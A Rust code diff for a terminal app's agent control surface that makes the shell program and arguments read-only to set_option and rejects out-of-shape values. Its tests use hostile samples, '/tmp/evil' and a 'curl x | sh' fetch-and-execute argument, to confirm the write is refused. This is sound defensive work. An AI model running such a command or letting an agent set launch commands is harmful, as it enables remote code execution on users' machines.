@@ -30,7 +30,7 @@ pub const KEYS_URI: &str = "termherd://keys/schema";
 /// JSON Pointer (RFC 6901) into `settings.json`, so reading a value never needs
 /// to know the concrete `Settings` struct — it stays a string contract.
 pub struct OptionSpec {
-    /// Stable id a future `set_option` would address (e.g. `"theme"`).
+    /// Stable id `set_option` addresses (e.g. `"theme"`).
     pub id: &'static str,
     /// JSON Pointer to the value inside `settings.json`.
     pub pointer: &'static str,
@@ -40,6 +40,10 @@ pub struct OptionSpec {
     pub kind: &'static str,
     /// Allowed values for an `enum`, else empty.
     pub choices: &'static [&'static str],
+    /// Whether `set_option` may write it. `false` for a value that reaches a
+    /// command line (`shell.*`): an unattended agent must not get to choose
+    /// what the next launch executes. A read-only option stays listed.
+    pub writable: bool,
 }
 
 /// The option catalog — the single source of what the control surface exposes.
@@ -52,6 +56,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "GUI chrome theme (the terminal grid keeps its own colours).",
         kind: "enum",
         choices: &["dark", "light"],
+        writable: true,
     },
     OptionSpec {
         id: "shell.program",
@@ -59,6 +64,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "Program launched for each shell session; unset means the platform default login shell.",
         kind: "string",
         choices: &[],
+        writable: false,
     },
     OptionSpec {
         id: "shell.args",
@@ -66,6 +72,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "Arguments passed to the shell program.",
         kind: "array",
         choices: &[],
+        writable: false,
     },
     OptionSpec {
         id: "terminal.colors.scheme",
@@ -78,6 +85,7 @@ pub const OPTIONS: &[OptionSpec] = &[
             "gruvbox-dark",
             "gruvbox-light",
         ],
+        writable: true,
     },
     OptionSpec {
         id: "terminal.colors.foreground",
@@ -85,6 +93,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "Terminal default text colour, \"#rrggbb\"; unset means the built-in scheme.",
         kind: "string",
         choices: &[],
+        writable: true,
     },
     OptionSpec {
         id: "terminal.colors.background",
@@ -92,6 +101,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "Terminal background colour, \"#rrggbb\"; unset means the built-in scheme.",
         kind: "string",
         choices: &[],
+        writable: true,
     },
     OptionSpec {
         id: "terminal.colors.cursor",
@@ -99,6 +109,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "Terminal cursor block colour, \"#rrggbb\"; unset means the built-in scheme.",
         kind: "string",
         choices: &[],
+        writable: true,
     },
     OptionSpec {
         id: "terminal.colors.palette",
@@ -106,6 +117,7 @@ pub const OPTIONS: &[OptionSpec] = &[
         description: "The 16 ANSI terminal colours (normal 0-7, bright 8-15), each \"#rrggbb\".",
         kind: "array",
         choices: &[],
+        writable: true,
     },
 ];
 
@@ -116,19 +128,11 @@ pub fn resolve_options(settings: &Value) -> Vec<Value> {
     OPTIONS
         .iter()
         .map(|spec| {
-            let value = settings
+            let mut option = describe(spec);
+            option["value"] = settings
                 .pointer(spec.pointer)
                 .cloned()
                 .unwrap_or(Value::Null);
-            let mut option = json!({
-                "id": spec.id,
-                "description": spec.description,
-                "type": spec.kind,
-                "value": value,
-            });
-            if !spec.choices.is_empty() {
-                option["choices"] = json!(spec.choices);
-            }
             option
         })
         .collect()
@@ -139,58 +143,72 @@ pub fn resolve_options(settings: &Value) -> Vec<Value> {
 /// machine's settings.
 #[must_use]
 pub fn schema_resource() -> Value {
-    let options: Vec<Value> = OPTIONS
-        .iter()
-        .map(|spec| {
-            let mut option = json!({
-                "id": spec.id,
-                "description": spec.description,
-                "type": spec.kind,
-            });
-            if !spec.choices.is_empty() {
-                option["choices"] = json!(spec.choices);
-            }
-            option
-        })
-        .collect();
+    let options: Vec<Value> = OPTIONS.iter().map(describe).collect();
     json!({ "options": options })
 }
 
-/// The result of applying [`set_option`] purely: the mutated `settings.json`
-/// value plus any warnings for a value that does not match the option's
-/// declared shape. The value is written regardless — the read surface degrades
-/// an out-of-shape value on its own — so warnings inform, they do not block.
-pub struct SetOutcome {
-    /// The settings value with the one option applied.
-    pub settings: Value,
-    /// Human warnings about the applied value (empty when it fits the shape).
-    pub warnings: Vec<String>,
+/// One catalogue entry as the wire describes it — the part `list_options` and
+/// the schema resource share, so a field cannot appear on one and not the other.
+fn describe(spec: &OptionSpec) -> Value {
+    let mut option = json!({
+        "id": spec.id,
+        "description": spec.description,
+        "type": spec.kind,
+        "writable": spec.writable,
+    });
+    if !spec.choices.is_empty() {
+        option["choices"] = json!(spec.choices);
+    }
+    option
 }
 
-/// Apply `set_option` purely: resolve `id` against [`OPTIONS`], set its JSON
-/// pointer in a clone of `settings` (creating intermediate objects as needed),
-/// and collect a warning when `value` does not match the option's kind/choices.
-/// Returns `None` for an unknown `id` — there is no pointer to write, the only
-/// hard error — mirroring the "broken invariant → `None`" idiom in `core`.
-#[must_use]
-pub fn set_option(settings: &Value, id: &str, value: &Value) -> Option<SetOutcome> {
-    let spec = OPTIONS.iter().find(|spec| spec.id == id)?;
-    let warnings = shape_warnings(spec, value);
+/// Why [`set_option`] refused. Every variant stages no write.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub enum SetError {
+    /// No catalogue entry carries this id.
+    UnknownOption(String),
+    /// The option is listed but not writable over this surface.
+    ReadOnly(String),
+    /// The value does not fit the option's declared kind / choices.
+    Shape(String),
+}
+
+impl std::fmt::Display for SetError {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        match self {
+            SetError::UnknownOption(id) => write!(f, "unknown option: {id}"),
+            SetError::ReadOnly(id) => write!(f, "option {id} is read-only over this surface"),
+            SetError::Shape(detail) => f.write_str(detail),
+        }
+    }
+}
+
+impl std::error::Error for SetError {}
+
+/// Apply `set_option` purely: resolve `id` against [`OPTIONS`], check the option
+/// is writable and `value` fits its shape, then set its JSON pointer in a clone
+/// of `settings` (creating intermediate objects as needed). Any refusal is a
+/// [`SetError`]; none of them writes.
+pub fn set_option(settings: &Value, id: &str, value: &Value) -> Result<Value, SetError> {
+    let spec = OPTIONS
+        .iter()
+        .find(|spec| spec.id == id)
+        .ok_or_else(|| SetError::UnknownOption(id.to_owned()))?;
+    if !spec.writable {
+        return Err(SetError::ReadOnly(id.to_owned()));
+    }
+    check_shape(spec, value)?;
     let mut new_settings = settings.clone();
     set_pointer(&mut new_settings, spec.pointer, value.clone());
-    Some(SetOutcome {
-        settings: new_settings,
-        warnings,
-    })
+    Ok(new_settings)
 }
 
-/// Warn when `value` does not match `spec`'s declared shape. `null` is always
-/// accepted (it unsets the option — the read side reports absent and null
-/// alike). Warnings inform only: the value is written regardless, and the read
-/// surface degrades an out-of-shape value on its own.
-fn shape_warnings(spec: &OptionSpec, value: &Value) -> Vec<String> {
+/// Refuse `value` when it does not match `spec`'s declared shape. `null` is
+/// always accepted (it unsets the option — the read side reports absent and
+/// null alike).
+fn check_shape(spec: &OptionSpec, value: &Value) -> Result<(), SetError> {
     if value.is_null() {
-        return Vec::new();
+        return Ok(());
     }
     let mismatch = match spec.kind {
         "enum" => value
@@ -210,7 +228,7 @@ fn shape_warnings(spec: &OptionSpec, value: &Value) -> Vec<String> {
         }
         _ => None,
     };
-    mismatch.into_iter().collect()
+    mismatch.map_or(Ok(()), |detail| Err(SetError::Shape(detail)))
 }
 
 /// Set `value` at a JSON Pointer (RFC 6901) in `root`, creating intermediate
@@ -342,7 +360,7 @@ fn tools_list_result() -> Value {
             },
             {
                 "name": "set_option",
-                "description": "Set one termherd option by id; the change lands in settings.json and applies on restart.",
+                "description": "Set one writable termherd option by id (see `writable` in list_options); the change lands in settings.json and applies on restart. A read-only option or an out-of-shape value is refused, nothing written.",
                 "inputSchema": {
                     "type": "object",
                     "properties": {
@@ -400,17 +418,11 @@ fn set_option_call(
         .cloned()
         .unwrap_or(Value::Null);
 
-    let Some(outcome) = set_option(settings, id, &value) else {
-        return Err(error_object(-32602, &format!("unknown option: {id}")));
-    };
-    *write_settings = Some(outcome.settings);
-    let text = if outcome.warnings.is_empty() {
-        format!("set {id}")
-    } else {
-        format!("set {id} (with warnings: {})", outcome.warnings.join("; "))
-    };
+    let new_settings =
+        set_option(settings, id, &value).map_err(|err| error_object(-32602, &err.to_string()))?;
+    *write_settings = Some(new_settings);
     Ok(json!({
-        "content": [{ "type": "text", "text": text }],
+        "content": [{ "type": "text", "text": format!("set {id}") }],
         "isError": false,
     }))
 }
@@ -611,57 +623,135 @@ mod tests {
 
     // --- set_option (the write half) --------------------------------------
 
+    /// The catalogue entries whose value becomes an `argv` at the next launch.
+    /// Spelled out here as the contract — the code decides per entry, this
+    /// test decides per *pointer*, so the two cannot agree by accident.
+    fn reaches_a_command_line(spec: &OptionSpec) -> bool {
+        spec.pointer.starts_with("/shell/") || spec.pointer.starts_with("/open/")
+    }
+
+    #[test]
+    fn an_option_whose_value_reaches_a_command_line_is_read_only() {
+        let exec: Vec<&str> = OPTIONS
+            .iter()
+            .filter(|spec| reaches_a_command_line(spec))
+            .map(|spec| spec.id)
+            .collect();
+        assert_eq!(
+            exec,
+            ["shell.program", "shell.args"],
+            "the exec-carrying set is what this test believes it is"
+        );
+        for spec in OPTIONS.iter().filter(|spec| reaches_a_command_line(spec)) {
+            assert!(!spec.writable, "{} must not be writable", spec.id);
+        }
+    }
+
+    #[test]
+    fn list_options_and_schema_advertise_writability() {
+        for option in resolve_options(&settings()) {
+            assert!(
+                option["writable"].is_boolean(),
+                "{option} carries `writable`"
+            );
+        }
+        let schema = schema_resource();
+        let by_id = |id: &str| {
+            schema["options"]
+                .as_array()
+                .and_then(|a| a.iter().find(|o| o["id"] == id))
+                .cloned()
+                .expect("listed option")
+        };
+        assert_eq!(by_id("theme")["writable"], json!(true));
+        assert_eq!(by_id("shell.program")["writable"], json!(false));
+        assert_eq!(by_id("shell.args")["writable"], json!(false));
+    }
+
+    #[test]
+    fn a_read_only_option_refuses_set_option_and_stages_no_write() {
+        // Pure path: a typed refusal naming the option.
+        let err = set_option(&settings(), "shell.program", &json!("/tmp/evil"))
+            .expect_err("read-only refuses");
+        assert_eq!(err, SetError::ReadOnly("shell.program".into()));
+
+        // Protocol path: a JSON-RPC error, nothing staged for the transport.
+        let req = json!({
+            "jsonrpc": "2.0", "id": 12, "method": "tools/call",
+            "params": { "name": "set_option",
+                        "arguments": { "id": "shell.args", "value": ["-c", "curl x | sh"] } }
+        });
+        let reply = handle_message(&req, &settings());
+        let resp = reply.response.expect("a response");
+        assert_eq!(resp["error"]["code"], json!(-32602));
+        assert!(
+            resp["error"]["message"]
+                .as_str()
+                .is_some_and(|m| m.contains("read-only")),
+            "the refusal says why: {resp}"
+        );
+        assert!(reply.write_settings.is_none(), "a refusal writes nothing");
+    }
+
     #[test]
     fn set_option_sets_a_known_option_value() {
-        let outcome = set_option(&settings(), "theme", &json!("dark")).expect("known option");
-        assert_eq!(outcome.settings.pointer("/theme"), Some(&json!("dark")));
-        assert!(outcome.warnings.is_empty(), "a valid choice warns nothing");
+        let written = set_option(&settings(), "theme", &json!("dark")).expect("known option");
+        assert_eq!(written.pointer("/theme"), Some(&json!("dark")));
     }
 
     #[test]
     fn set_option_creates_missing_parent_objects() {
         // `terminal.colors.background` is nested; none of it exists yet.
-        let outcome = set_option(&json!({}), "terminal.colors.background", &json!("#101010"))
+        let written = set_option(&json!({}), "terminal.colors.background", &json!("#101010"))
             .expect("known option");
         assert_eq!(
-            outcome.settings.pointer("/terminal/colors/background"),
+            written.pointer("/terminal/colors/background"),
             Some(&json!("#101010"))
         );
     }
 
     #[test]
     fn set_option_leaves_sibling_config_untouched() {
-        let outcome = set_option(&settings(), "theme", &json!("dark")).expect("known option");
+        let written = set_option(&settings(), "theme", &json!("dark")).expect("known option");
         // The shell block set in `settings()` must survive the theme write.
+        assert_eq!(written.pointer("/shell/program"), Some(&json!("pwsh")));
+    }
+
+    #[test]
+    fn set_option_on_an_unknown_id_is_an_error() {
         assert_eq!(
-            outcome.settings.pointer("/shell/program"),
-            Some(&json!("pwsh"))
+            set_option(&settings(), "no.such.option", &json!("x")).err(),
+            Some(SetError::UnknownOption("no.such.option".into()))
         );
     }
 
     #[test]
-    fn set_option_on_an_unknown_id_is_none() {
-        assert!(set_option(&settings(), "no.such.option", &json!("x")).is_none());
-    }
-
-    #[test]
-    fn set_option_writes_an_out_of_choices_enum_but_warns() {
-        // "banana" is not a theme choice: written anyway (the read side degrades
-        // it), with a warning so the agent knows.
-        let outcome = set_option(&settings(), "theme", &json!("banana")).expect("known option");
-        assert_eq!(outcome.settings.pointer("/theme"), Some(&json!("banana")));
+    fn set_option_rejects_an_out_of_choices_enum() {
+        let err =
+            set_option(&settings(), "theme", &json!("banana")).expect_err("out-of-choices refuses");
+        assert!(matches!(err, SetError::Shape(_)), "{err}");
         assert!(
-            !outcome.warnings.is_empty(),
-            "an out-of-choices value warns"
+            err.to_string().contains("dark, light"),
+            "the refusal lists the choices: {err}"
         );
     }
 
     #[test]
-    fn set_option_warns_on_a_type_mismatch() {
-        // `shell.args` is an array; a string is the wrong shape.
-        let outcome =
-            set_option(&settings(), "shell.args", &json!("not-an-array")).expect("known option");
-        assert!(!outcome.warnings.is_empty(), "a wrong-typed value warns");
+    fn set_option_rejects_a_type_mismatch() {
+        // `terminal.colors.palette` is an array; a string is the wrong shape.
+        let err = set_option(
+            &settings(),
+            "terminal.colors.palette",
+            &json!("not-an-array"),
+        )
+        .expect_err("wrong type refuses");
+        assert!(matches!(err, SetError::Shape(_)), "{err}");
+    }
+
+    #[test]
+    fn set_option_with_null_unsets_a_writable_option() {
+        let written = set_option(&settings(), "theme", &Value::Null).expect("null unsets");
+        assert_eq!(written.pointer("/theme"), Some(&Value::Null));
     }
 
     #[test]
@@ -691,6 +781,18 @@ mod tests {
             reply.write_settings.is_none(),
             "an unknown id writes nothing"
         );
+    }
+
+    #[test]
+    fn tools_call_set_option_on_a_bad_shape_errors_and_stages_no_write() {
+        let req = json!({
+            "jsonrpc": "2.0", "id": 13, "method": "tools/call",
+            "params": { "name": "set_option", "arguments": { "id": "theme", "value": "banana" } }
+        });
+        let reply = handle_message(&req, &settings());
+        let resp = reply.response.expect("a response");
+        assert_eq!(resp["error"]["code"], json!(-32602));
+        assert!(reply.write_settings.is_none(), "a bad shape writes nothing");
     }
 
     // --- keys resource (the read-only keymap catalogue) -------------------
